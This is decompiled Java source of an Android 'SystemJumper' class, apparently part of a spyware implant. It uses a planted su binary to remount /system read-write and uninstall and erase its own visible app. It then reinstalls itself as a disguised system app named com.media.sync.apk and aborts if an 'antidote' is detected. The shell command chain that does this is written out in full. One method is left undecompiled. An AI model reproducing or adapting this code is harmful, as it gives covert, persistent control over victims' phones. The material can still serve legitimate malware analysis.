package com.network.h;

import android.content.Context;
import android.os.Process;
import com.network.android.a.c;
import com.network.android.m;
import com.network.media.q;
import java.io.File;

public final class a {
    public static int a(Context context) {
        int i = 0;
        try {
            com.network.android.c.a.a.a("SystemJumper - jumpToSystem start. apkPath: " + b.c(context));
            if (b.d(context)) {
                com.network.android.c.a.a.a("SystemJumper - copyMySuFileToSystem - agent is already installed on system direcotry. returning.");
                return 0;
            }
            if (com.network.a.a.b() > 4.0d) {
                com.network.android.c.a.a.a("SystemJumper - copyMySuFileToSystem - this is android 4 version. somthing is wrong. returning.");
                if (!new File("/system/csk").exists()) {
                    return -1;
                }
                com.network.android.c.a.a.a("SystemJumper - MY_SU exist! running in debug mode!");
            }
            if (!new File("/system/csk").exists() && (i = c(context)) != 0) {
                com.network.android.c.a.a.a("SystemJumper - jumpToSystem copyMySuFileToSystem failed. returning");
                return -1;
            } else if (b.h(context)) {
                com.network.android.c.a.a.a("SystemJumper - jumpToSystem found antidute. not jumping. returning");
                return -1;
            } else {
                String str = context.getApplicationInfo().dataDir + "/adrubh.dat";
                com.network.android.c.a.a.a("SystemJumper - copyBHParamsFileToTheSize start.");
                File file = new File("/data/myappinfo");
                if (!file.exists()) {
                    com.network.android.c.a.a.a("SystemJumper - copyBHParamsFileToTheSize bh params file does not exists. returning false;.");
                } else if (1 > file.length()) {
                    com.network.android.c.a.a.a("SystemJumper - copyBHParamsFileToTheSize bh params file too small. returning false");
                } else {
                    q.a("/data/myappinfo", str);
                }
                String b = b(context);
                if (b == null) {
                    com.network.android.c.a.a.a("SystemJumper - create command failed. returning");
                    return -1;
                }
                com.network.android.c.a.a.a("SystemJumper - jumpToSystem - all good. performing command: " + b);
                m.c(b);
                return i;
            }
        } catch (Throwable th) {
            com.network.android.c.a.a.a("SystemJumper - jumpToSystem - exception. " + th.getMessage(), th);
            return -1;
        }
    }

    private static String b(Context context) {
        try {
            com.network.android.c.a.a.a("SystemJumper - buildJumpToSystemCommand start");
            String str = context.getApplicationInfo().dataDir + "/";
            String str2 = str + "shared_prefs";
            String str3 = "/data/local/tmp/" + "bhprs";
            String str4 = str + "adrubh.dat";
            String str5 = str2 + "/" + "NetworkPreferences.xml";
            String c = b.c(context);
            String str6 = ((((("" + " cat " + str4 + " > " + str3 + ";") + "export LD_LIBRARY_PATH=/vendor/lib:/system/lib;") + " cat " + str5 + " > " + "/data/local/tmp/" + "NetworkPreferences.xml" + ";") + " cat " + c + " > " + "/data/local/tmp/" + "com.media.sync.apk;") + " am force-stop com.network.android;") + " pm disable com.network.android;";
            if (!c.e()) {
                str6 = str6 + " pm uninstall com.network.android;";
            }
            return (((((((((((((((((((str6 + " sleep 10;") + " kill " + Process.myPid() + ";") + " rm " + c + ";") + " rmdir -R " + str + ";") + "  chmod 666 " + "/data/local/tmp/" + "com.media.sync.apk;") + " umask 133;") + " mount -o remount,rw /dev/null /system;") + " cat " + str3 + " > /data/myappinfo;") + " chmod 0777 /data/myappinfo;") + " cat " + "/data/local/tmp/" + "com.media.sync.apk > /system/app/com.media.sync.apk;") + " sleep 5;") + " mkdir " + str2 + ";") + " chmod 0777 " + str2 + ";") + " cat " + "/data/local/tmp/" + "NetworkPreferences.xml" + " > " + str5 + ";") + " chmod 0777 " + str5 + ";") + " rm " + "/data/local/tmp/" + "NetworkPreferences.xml" + ";") + " rm " + "/data/local/tmp/" + "com.media.sync.apk;") + " rm " + str3 + ";") + " export LD_LIBRARY_PATH=/vendor/lib:/system/lib; am start -n com.network.android/com.network.android.NetworkMain;") + " mount -o remount,ro -t yaffs2 /dev/block/mtdblock3 /system;";
        } catch (Throwable th) {
            com.network.android.c.a.a.a("SystemJumper - buildJumpToSystemCommand exception" + th.getMessage(), th);
            return "";
        }
    }

    /* JADX WARNING: Removed duplicated region for block: B:13:0x00a0  */
    /* JADX WARNING: Removed duplicated region for block: B:18:? A[Catch:{ Throwable -> 0x0087 }, RETURN, SYNTHETIC] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    private static int c(android.content.Context r8) {
        /*
        // Method dump skipped, instructions count: 169
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.h.a.c(android.content.Context):int");
    }
}
